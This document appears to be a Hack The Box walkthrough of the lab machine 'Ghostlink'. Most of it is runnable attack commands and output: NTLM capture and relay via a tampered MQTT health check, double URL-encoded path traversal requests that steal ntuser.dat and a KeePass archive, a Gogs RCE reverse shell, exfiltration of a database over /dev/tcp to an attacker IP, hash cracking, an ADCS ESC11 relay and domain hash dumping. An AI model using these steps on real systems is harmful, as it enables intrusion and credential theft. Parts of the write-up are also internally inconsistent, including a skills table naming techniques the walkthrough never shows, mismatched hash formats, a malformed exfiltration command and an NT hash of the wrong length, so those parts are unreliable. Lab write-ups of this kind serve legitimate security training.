
# 👻 Ghostlink - HTB Machine Walkthrough

> **Machine:** Ghostlink  
> **Difficulty:** Hard  
> **Platform:** Hack The Box  
> **Date:** 27th April 2026  
> **Prepared By:** ctrlzero  
> **Machine Author:** ctrlzero  

---

## 📋 Table of Contents
- [Synopsis](#synopsis)
- [Skills Required & Learned](#skills-required--learned)
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [MQTT Service](#mqtt-service)
  - [Gogs Version Discovery](#gogs-version-discovery)
- [Foothold](#foothold)
  - [NTLM Relay via MQTT Health Check](#ntlm-relay-via-mqtt-health-check)
  - [Double URL-Encoded Path Traversal](#double-url-encoded-path-traversal)
  - [KeePass Database Analysis](#keepass-database-analysis)
  - [Gogs RCE (CVE-2025-8110)](#gogs-rce-cve-2025-8110)
- [Lateral Movement](#lateral-movement)
  - [Gogs Database Exfiltration](#gogs-database-exfiltration)
  - [Hash Cracking](#hash-cracking)
  - [Pivot to nvirelli](#pivot-to-nvirelli)
- [Privilege Escalation](#privilege-escalation)
  - [ADCS Enumeration](#adcs-enumeration)
  - [ESC11 Attack](#esc11-attack)
  - [Domain Compromise](#domain-compromise)
- [Flags](#flags)
- [Attack Chain](#attack-chain)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---
```markdown
## Synopsis

Ghostlink is a Hard difficulty Windows machine featuring an Active Directory domain controller and a web server. Enumeration reveals a critical MQTT service used for node tracking, which exposes two internal hosts: a secure file sharing app and a Gogs code host.

The attacker modifies the MQTT health check to trigger NTLM authentication, relaying credentials to authenticate as the `svc_canary` service account. Using this authentication, the attacker exploits a double URL-encoded path traversal vulnerability to exfiltrate the service account's `ntuser.dat` file. Analysis of the registry hive reveals a recent document for `db.zip`, containing KeePass credentials for the Gogs application.

These credentials are then leveraged to exploit an RCE vulnerability **CVE-2025-8110** in Gogs to obtain a foothold. Once on the system, the attacker cracks a Gogs hash to log in as the local user `nvirelli`. Finally, the **ESC11** vulnerability in ADCS allows the attacker to request a Domain Controller certificate and compromise the domain.
```
---

## Skills Required & Learned

| **Skills Required** | **Skills Learned** |
|:--------------------|:-------------------|
| Network Enumeration | SSRF Exploitation via Apache CXF Aegis (XOP Inclusion) |
| MQTT Protocol Familiarity | Flask Session Forgery |
| NTLM Relay Attacks | Command Injection Filter Bypass |
| HTTP Web Application Interaction | Symlink Chain Abuse |
| Path Traversal Fundamentals | |

---

## Enumeration

### Nmap

```bash
# Discover open ports
ports=$(nmap -p- --min-rate=1000 -T4 10.129.244.158 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

# Detailed scan
nmap -p$ports -sC -sV 10.129.244.158
```

**Results:**
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
1883/tcp open  mqtt          Mosquitto MQTT
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing
```

**Add to /etc/hosts:**
```bash
echo "10.129.244.158 ghostlink.htb dc01.ghostlink.htb" | sudo tee -a /etc/hosts
```

### MQTT Service

```bash
# Install MQTT client
sudo apt install mqttui

# Connect to MQTT service
mqttui -b mqtt://ghostlink.htb
```

**Discovered Topics:**
- `GhostProtocolZero/systems/node/secureshare/healthcheck`
- `GhostProtocolZero/systems/node/toolkits/healthcheck`

**Revealed Internal Hosts:**
- `gpz-op26-secure.ghostlink.htb` → Secure File Sharing App
- `gpz-op26-toolkits.ghostlink.htb` → Gogs Installation

**Add to /etc/hosts:**
```bash
echo "10.129.244.158 gpz-op26-secure.ghostlink.htb gpz-op26-toolkits.ghostlink.htb" | sudo tee -a /etc/hosts
```

### Gogs Version Discovery

```html
<link rel="stylesheet" href="/css/gogs.min.css?v=5084b4a9b77a506f5e287e82e945e1c6882b827a">
<script src="/js/gogs.js?v=5084b4a9b77a506f5e287e82e945e1c6882b827a"></script>
```

**Hash:** `5084b4a9b77a506f5e287e82e945e1c6882b827a`

**Gogs Version:** `0.13.3` (based on commit history)

---

## Foothold

### NTLM Relay via MQTT Health Check

**1. Read the health check topic:**

```bash
mqttui -b mqtt://ghostlink.htb r "GhostProtocolZero/systems/node/secureshare/healthcheck"
```

**Payload:**
```json
{
  "timestamp": "2026-04-27 15:45:45",
  "node": "node-6",
  "telemetry": {
    "healthy": true,
    "url": "gpz-op26-secure.ghostlink.htb/healthcheck",
    "lastCheckSecAgo": 30,
    "responseCode": "200",
    "ip": "172.16.20.10"
  }
}
```

**2. Modify the health check URL to point to attacker machine:**

```bash
sudo responder -I tun0 -v
```

```bash
PAYLOAD='{"timestamp":"2026-03-03 09:26:21","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.2","lastCheckSecAgo":45,"responseCode":"200","ip":"172.16.20.10"}}'

mqttui -b mqtt://ghostlink.htb publish -r "GhostProtocolZero/systems/node/secureshare/healthcheck" "$PAYLOAD"
```

**3. Capture NTLM hash:**

```
[HTTP] NTLMv2 Client: 10.129.244.158
[HTTP] NTLMv2 Username: ghostlink\svc_canary
```

**4. Relay NTLM authentication using Ghostsurf:**

```bash
# Clone Ghostsurf
git clone https://github.com/senderend/ghostsurf.git
cd ghostsurf

# Apply patch (Line 52 in ghostsurf/lib/relay/utils/config.py)
# Add: self.remove_target = False

# Start relay with SOCKS proxy
./ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb -r -k --http-port 8888 --no-smb-server

[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] Authenticating connection from GHOSTLINK/SVC_CANARY SUCCEED [1]
[*] SOCKS: Adding GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy
```

### Double URL-Encoded Path Traversal

**Vulnerability:** The file sharing app allows path traversal when double URL-encoding is used.

**1. Download `ntuser.dat`:**

```http
GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2575%2573%2565%2572%2573%255c%2573%2576%2563%255f%2563%2561%256e%2561%2572%2579%255c%256e%2574%2575%2573%2565%2572%252e%2564%2561%2574 HTTP/1.1
Host: gpz-op26-secure.ghostlink.htb
```

**Decoded Path:**
```
\..\..\..\..\..\..\..\users\svc_canary\ntuser.dat
```

**2. Analyze with RegRipper:**

```bash
regripper -r ntuser.dat -a | grep -i recent -A 3 -B 3
```

**Findings:**
```
RecentDocs\.zip
LastWrite Time: 2026-02-25 14:04:19Z
MRUListEx = 0
0 = db.zip
```

**3. Download `db.zip.lnk`:**

```http
GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2575%2573%2565%2572%2573%255c%2573%2576%2563%255f%2563%2561%256e%2561%2572%2579%255c%2541%2570%2570%2544%2561%2574%2561%255c%2552%256f%2561%256d%2569%256e%2567%255c%254d%2569%2563%2572%256f%2573%256f%2566%2574%255c%2557%2569%256e%2564%256f%2577%2573%255c%2552%2565%2563%2565%256e%2574%255c%2564%2562%252e%257a%2569%2570%252e%256c%256e%256b HTTP/1.1
```

**4. Extract path from .lnk:**

```bash
strings db.zip.lnk
C:\Users\svc_canary\Documents\Operations\Management\db.zip
```

**5. Download `db.zip`:**

```http
GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2575%2573%2565%2572%2573%255c%2573%2576%2563%255f%2563%2561%256e%2561%2572%2579%255c%2544%256f%2563%2575%256d%2565%256e%2574%2573%255c%254f%2570%2565%2572%2561%2574%2569%256f%256e%2573%255c%254d%2561%256e%2561%2567%2565%256d%2565%256e%2574%255c%2564%2562%252e%257a%2569%2570 HTTP/1.1
```

### KeePass Database Analysis

```bash
unzip -l db.zip
Archive: db.zip
  Length  Date         Name
  ------  ----------   ----
      240 2026-02-24   .key.keyx
     4686 2026-03-03   db.kdbx

keepass2 db.kdbx
```

**KeePass Findings:**
- Entry: **vrotch** (only entry not migrated)
- Attachment: **passpol.pdf** (domain password policy)
- Recycle Bin contains password policy information

**Credentials:**
```
Username: vrotch
Password: (found in KeePass entry)
```

### Gogs RCE (CVE-2025-8110)

```bash
python3 CVE-2025-8110.py -u http://gpz-op26-toolkits.ghostlink.htb -lh 10.10.14.2 -lp 10001

[+] Authenticated successfully
[+] Application token generated
[+] Exploit sent, check your listener!
```

**Result:**
```bash
nc -lvnp 10001
connect to [10.10.14.2] from (UNKNOWN) [10.129.244.158] 49876
git@gpz-op26-toolkits:~/data/tmp/local-repo/7$
```

---

## Lateral Movement

### Gogs Database Exfiltration

```bash
# Attacker - start listener
nc -lvnp 4444 > gogs.db

# Target - exfiltrate database
git@gpz-op26-toolkits:/opt/gogs/data/gogs.db > /dev/tcp/10.10.14.2/4444
```

### Hash Cracking

**Gogs Hash Format:**
```
sha256:10000:RFCzWWR4UHkyNQ==:jZs6Ac0gJgs52wEa7R2/I5uLGyiVUHyiqAdOzq4/9RAi8W5B1/5V+cWN1p77BdV0+g=
```

**Convert to Hashcat format:**
```bash
python3 GogsToHashcat.py -n 10000 DW3YdxPy25 8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8
```

**Build wordlist (minimum 20 characters):**
```bash
grep -E '.{20,}$' rockyou.txt > trimmed.txt
```

**Crack hash:**
```bash
hashcat -m 10900 -a 0 hash.txt trimmed.txt
```

**Cracked Password:**
```
u47YucIrDiwWxBheaSzI
```

### Pivot to nvirelli

```bash
git@gpz-op26-toolkits:/tmp$ su nvirelli
Password: u47YucIrDiwWxBheaSzI

nvirelli@gpz-op26-toolkits:~$ cd ~
nvirelli@gpz-op26-toolkits:~$ ls
user.txt
```

---

## Privilege Escalation

### ADCS Enumeration

```bash
proxychains -q certify find -u 'nvirelli@ghostlink.htb' -p u47YucIrDiwWxBheaSzI -dc-host dc01.ghostlink.htb -ns 10.129.244.158 --dns-tcp -timeout 10 --vulnerable --stdout
```

**Findings:**
```
[!] Vulnerabilities
ESC8  : Web Enrollment is enabled over HTTP.
ESC11 : Encryption is not enforced for ICPR (RPC) requests.
```

### ESC11 Attack

**1. Set up ntlmrelayx:**

```bash
sudo proxychains -q ntlmrelayx.py -t rpc://172.16.20.10 --rpc-mode ICPR --icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' --smb2support --template DomainController
```

**2. Coerce authentication:**

```bash
coercer coerce -l 10.10.14.2 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirelli -p u47YucIrDiwWxBheaSzI --dc-ip dc01.ghostlink.htb --always-continue
```

**3. NTLM relay output:**

```
[*] (RPC): Authenticating connection from GHOSTLINK/DC01$ SUCCEED [1]
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Generating CSR...
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> CSR generated!
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Getting certificate...
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Successfully requested certificate
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
```

### Domain Compromise

**1. Authenticate with certificate:**

```bash
certipy auth -pfx DC01.pfx -dc-ip dc01.ghostlink.htb --dns-tcp -ns 10.129.244.158 -timeout 10 -domain ghostlink.htb

[*] Got hash for 'dc01$@ghostlink.htb': aad3b435b51404eeaad3b435b51404ee:f09e86e9b9c7e94f2fabaa9e31757e50
```

**2. Dump domain hashes:**

```bash
secretsdump.py ghostlink.htb/dc01$@dc01.ghostlink.htb -dc-ip ghostlink.htb -hashes :f09e86e9b9c7e94f2fabaa9e31757e50 -just-dc-user administrator

Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002dd6d63eb209b016696:::
```

**3. WinRM as Administrator:**

```bash
evil-winrm -i dc01.ghostlink.htb -u administrator -H 8190e067f478002dd6d63eb209b016696

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

## 🏁 Flags

| **Flag** | **Location** |
|:---------|:-------------|
| **User.txt** | `/home/nvirelli/user.txt` |
| **Root.txt** | `C:\Users\Administrator\Desktop\root.txt` |

---

## 🗺️ Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         GHOSTLINK ATTACK CHAIN                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. RECONNAISSANCE                                                          │
│     ├─> Nmap → MQTT service discovered (port 1883)                        │
│     └─> MQTT enumeration → gpz-op26-secure & gpz-op26-toolkits found     │
│                                                                             │
│  2. NTLM RELAY                                                             │
│     ├─> Modify MQTT health check → trigger NTLM authentication            │
│     ├─> Ghostsurf relay → SOCKS proxy as svc_canary                      │
│     └─> Authenticated access to gpz-op26-secure                           │
│                                                                             │
│  3. PATH TRAVERSAL (Double URL-encoded)                                    │
│     ├─> Exfiltrate svc_canary\ntuser.dat                                  │
│     ├─> RegRipper → db.zip.lnk path                                      │
│     ├─> Exfiltrate db.zip → KeePass database                              │
│     └─> vrotch credentials recovered                                      │
│                                                                             │
│  4. GOGS RCE (CVE-2025-8110)                                               │
│     └─> Authenticated RCE → Reverse shell as git                         │
│                                                                             │
│  5. LATERAL MOVEMENT                                                       │
│     ├─> Exfiltrate gogs.db → crack hash → nvirelli password               │
│     └─> Pivot to nvirelli user                                            │
│                                                                             │
│  6. ADCS ESC11                                                             │
│     ├─> Coerce DC01 authentication                                        │
│     ├─> NTLM relay → request Domain Controller certificate                │
│     └─> certipy auth → DC01 hash                                          │
│                                                                             │
│  7. DOMAIN COMPROMISE                                                      │
│     ├─> secretsdump → Administrator hash                                 │
│     └─> evil-winrm → SYSTEM on DC01                                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🧠 Key Takeaways

1. **MQTT services often expose internal infrastructure.** Always enumerate topics thoroughly.

2. **NTLM relay attacks are effective when you can control authentication triggers.** MQTT health checks are a perfect vector.

3. **Double URL-encoding can bypass path traversal protections.** Always test for this.

4. **KeePass recycle bin can contain valuable deleted entries.** Check it thoroughly.

5. **Gogs CVE-2025-8110 requires authentication**, but credentials are often found elsewhere.

6. **Password policies in attachments (passpol.pdf) help build better wordlists** for cracking.

7. **ESC11 is a powerful ADCS attack** when encryption is not enforced for ICPR RPC requests.

8. **Certipy makes certificate-based authentication easy** for domain compromise.

---

## 🛠️ Tools Used

| **Tool** | **Purpose** |
|:---------|:------------|
| **nmap** | Port scanning and service enumeration |
| **mqttui** | MQTT topic enumeration and publishing |
| **Ghostsurf** | NTLM relay with SOCKS proxy support |
| **RegRipper** | Registry hive analysis |
| **strings** | Extract readable strings from binary files |
| **KeePass2** | Open KeePass databases |
| **Certify** | ADCS enumeration |
| **Coercer** | NTLM authentication coercion |
| **ntlmrelayx** | NTLM relay attacks |
| **certipy** | Certificate-based AD authentication |
| **secretsdump** | Dump domain hashes |
| **evil-winrm** | WinRM shell with hash authentication |
| **hashcat** | Password cracking |
| **GogsToHashcat** | Convert Gogs hashes to Hashcat format |

---

## 📚 References

- [CVE-2025-8110 - Gogs RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-8110)
- [ESC11 - ADCS Vulnerability](https://www.specterops.io/)
- [NTLM Relay Attacks](https://www.trustedsec.com/)
- [MQTT Protocol Documentation](https://mqtt.org/)

---



**🔥 Happy Hacking! 🔥**



